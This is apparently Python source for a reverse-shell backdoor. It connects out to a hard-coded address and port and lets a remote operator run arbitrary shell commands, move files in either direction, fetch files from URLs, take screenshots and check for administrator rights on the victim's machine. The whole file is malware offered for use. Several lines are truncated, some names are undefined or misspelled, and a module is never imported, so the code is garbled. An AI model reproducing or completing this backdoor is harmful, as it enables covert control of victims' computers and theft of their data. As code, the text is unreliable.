import json
import time
import os
import shutil
import sys
import base64
import requests
import ctypes
from mss import mss

def reliable_send(data):
        json_data = json.dumps(data)
        sock.send(json_data)

def reliable_recv():
        json_data = ""
        while True:
                try: 
                        json_data = json_data + sock.recv(1024)
                        return json.loads(json_data)
                except ValueError:
                        continue

def is_admin(): 
        global admin
        try:
                temp = os.listdir(os.sep.join([os.environ.get('SystemRoot','C:\>
        except:
                admin="[!!] User Privileges!"
        else:
                admin="[+] Administrator Privileges!"

def screenshot():
        with mss() as screenshot:
                screenshot.shot()

def download(url):
        get_response = requests.get(url)
        file_name = url.split("/")[-1]
        with open(file_name, "wb") as out_file:
                out_file.write(get_response.content)

def connection():
        while True:
                time.sleep(20)
                try:
                        sock.connect(("192.168.0.108",54321))
                        shell()
                except:
                        connection()

def shell():
         while True:
                command = reliable_recv()
                if command == "q":
                        break
                elif command == "help":
                        help_connection = '''                                      download path -> Download A file >
                                             upload path -> Upload A file To Target PC
                                             get url     -> Download File To Target From Any Website
                                             start path  -> Start Progress on Target PC
                                             screenshot  -> Take A Screenshot Of Targets Monitor
                                             check       -> Check For Administrator Privileges
                                             q           -> Exit The Reverse Shell '''
                        reliable_send(help_options)
                elif command[:2] == "cd" and len(command) > 1:
                        try:
                               os.chdir(command[3:])
                        except:
                               continue
                elif command[:8] == "download":
                        with open(command[9:], "rb") as file:
                                reliable_send(base64.b64encode(file.react))
                elif command[:6] == "upload":
                        with open(command[7:], "wb") as fin:
                                result = reliable_recv()
                                fin.write(base64.b64decode(result))
                elif command[:3] == "get":
                        try:
                                download(command[4:])
                                reliable_send("[+] Downloaded File From Specified URL!")
                        except:
                                reliable_send("[!!] Failed To Download File")
                elif command[:5] == "start":
                        try:
                                subprocess.Popen(command[6:], shell=True)
                                reliable_send("[+] Started!")
                        except:
                                reliable_send("[!!] Failed To Start!")
                elif command[:10] == "screenshot":
                        try:
                                screenshot()
                                with open("monitor-1.png","rb") as sc:
                                        reliable_send(base64.b64encode(sc.read()))
                                os.remove("monitor-1.png")
                        except:
                                reliable_send("[!!] Failed To Take Screenshot")
                elif command[:5] == "check":
                        try:
                                is_admin()
                                reliable_send(admin)
                        except:
                                reliable_send("Cant perform the Check")
                else:
                        try:
                                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subproce>
                                result = proc.stdout.read() + proc.stderr.read()
                                reliable_send(result)
                        except:
                                reliable_send("[!!] Cant Execute That Command")
